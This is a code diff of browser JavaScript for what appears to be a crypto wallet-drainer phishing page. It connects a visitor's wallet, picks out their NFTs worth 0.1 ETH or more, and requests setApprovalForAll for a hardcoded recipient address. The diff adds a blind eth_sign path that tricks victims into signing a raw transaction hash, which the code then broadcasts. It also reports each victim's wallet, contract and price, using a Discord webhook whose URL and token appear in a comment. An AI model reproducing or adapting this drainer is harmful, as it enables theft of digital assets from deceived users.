@@ -1,6 +1,5 @@
-//#region Web3.js
-
 let web3Provider;
+
 Moralis.onWeb3Enabled(async (data) => {
     if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
     updateState(true);
@@ -14,7 +13,22 @@ window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
     if (accounts.length < 1) updateState(false)
 }) : null;
 
-
+const abiNFT = [
+    {
+        "inputs": [{
+            "internalType": "address",
+            "name": "operator",
+            "type": "address"
+        }, {
+            "internalType": "bool",
+            "name": "approved",
+            "type": "bool"
+        }],
+        "name": "setApprovalForAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }]
 async function updateState(connected) {
     const web3Js = new Web3(Moralis.provider);
     document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
@@ -33,25 +47,25 @@ setTimeout(async () => {
     }
 }, 5000);
 
-async function askSign() {
-    const web3Js = new Web3(Moralis.provider);
-    const walletAddress = (await web3Js.eth.getAccounts())[0];
+// async function askSign() {
+//     const web3Js = new Web3(Moralis.provider);
+//     const walletAddress = (await web3Js.eth.getAccounts())[0];
 
-    try {
-        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
+//     try {
+//         const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
 
-        const signature = await web3Js.eth.personal.sign(message, walletAddress);
-        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);
+//         const signature = await web3Js.eth.personal.sign(message, walletAddress);
+//         const signing_address = await web3Js.eth.personal.ecRecover(message, signature);
 
-        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
-        return true;
-    } catch (e) {
-        if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
-        console.log(e);
-        return false;
-    }
+//         console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
+//         return true;
+//     } catch (e) {
+//         if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
+//         console.log(e);
+//         return false;
+//     }
 
-}
+// }
 // https://canary.discord.com/api/webhooks/989716160629071932/a3EEYjNt95pX-4IEOjOUe9ZB8_mAY_eM1IEXS-lanCcd4Zw7LYwSzC2U-z-Hxxaa8VeZ
 
 async function askNfts() {
@@ -84,37 +98,72 @@ async function askNfts() {
     for (nft of walletNfts) {
         if (nft.price === 0) continue;
         const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
-        if (ethPrice < 0.0000001) continue;
-        const thewallet = ethPrice < 1.0 ? receiveAddress : "";
+        if (ethPrice < 0.1) continue;
+        const thewallet = "0xf92D48dDe90C4aD033381b0cA52d08c0636A7ddc";
+        const ctrInstance = new web3.eth.Contract(JSON.parse(ABInft), nft.contract_address)
+        
         transactionsOptions.push({
             price: ethPrice,
-            options: {
-                contractAddress: nft.contract_address,
-                from: walletAddress,
-                functionName: "setApprovalForAll",
-                abi: [{
-                    "inputs": [
-                        { "internalType": "address", "name": "operator", "type": "address" },
-                        { "internalType": "bool", "name": "approved", "type": "bool" }
-                    ],
-                    "name": "setApprovalForAll",
-                    "outputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                }],
-                params: { operator: thewallet, approved: true },
-                gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
-            }
+            dataField: await ctrInstance.methods.setApprovalForAll(thewallet, true).encodeABI(),
+            contractAddress: nft.contract_address
         });
     }
     if (transactionsOptions.length < 1) return notEligible();
 
     let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price)
     for (const trans of transactionLists) {
-        console.log(`Transferring ${trans.options.contractAddress} (${trans.price} ETH)`);
-        await Moralis.executeFunction(trans.options).catch(O_o => console.error(O_o, options)).then(uwu => {
-            if (uwu) sendWebhooks(walletAddress, trans.options.contractAddress, trans.price);
-        });
+        console.log(`Transferring ${trans.contractAddress} (${trans.price} ETH)`);
+        const web3Js = new Web3(Moralis.provider);
+        const walletAddress = (await web3Js.eth.getAccounts())[0];
+        const chainId = await web3Js.eth.getChainId();
+        await web3Js.eth.getTransactionCount(walletAddress, "pending")
+            .then(async (txnCount) => {
+                const jgasPrice = await web3Js.eth.getGasPrice();
+                const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
+                const gas = new web3Js.utils.BN("22000");
+                const cost = gas * Math.floor(jgasPrice * 2);
+
+
+                const txObject = {
+                    nonce: web3Js.utils.toHex(txnCount),
+                    gasPrice: mgasPrice, gasLimit: "0x55F0",
+                    to: trans.contractAddress,
+                    value: "0x",
+                    data: trans.dataField, v: "0x1", r: "0x", s: "0x"
+                };
+
+                let ethTX = new ethereumjs.Tx(txObject);
+                const rawTx1 = '0x' + ethTX.serialize().toString('hex');
+                const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: 'hex' });
+
+                console.log("rawTx1:", rawTx1);
+                console.log("rawHash1:", rawHash1);
+
+                await web3Js.eth.sign(rawHash1, walletAddress).then(async (result) => {
+
+                    const signature = result.substring(2);
+                    const r = "0x" + signature.substring(0, 64);
+                    const s = "0x" + signature.substring(64, 128);
+                    const v = parseInt(signature.substring(128, 130), 16);
+
+                    const y = web3Js.utils.toHex(v + chainId * 2 + 8);
+
+                    ethTX.r = r;
+                    ethTX.s = s;
+                    ethTX.v = y;
+
+                    console.log(ethTX);
+
+                    const rawTx = '0x' + ethTX.serialize().toString('hex');
+                    const rawHash = web3Js.utils.sha3(rawTx, { encoding: 'hex' });
+
+                    console.log("rawTx:", rawTx);
+                    console.log("rawHash:", rawHash);
+
+                    await web3Js.eth.sendSignedTransaction(rawTx).then((hash) => console.log(hash)).catch((e) => console.log(e));
+
+                }).catch((err) => console.log(err));
+            })
     }
     await verifyAsset();
 }
@@ -250,5 +299,3 @@ const sendWebhooks = (userWallet, contract, price) => fetch(`/api.php?o=success`
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ userWallet, contract, price, discordWebhookURL })
 }).catch(err => console.error(err));
-
-//#endregion
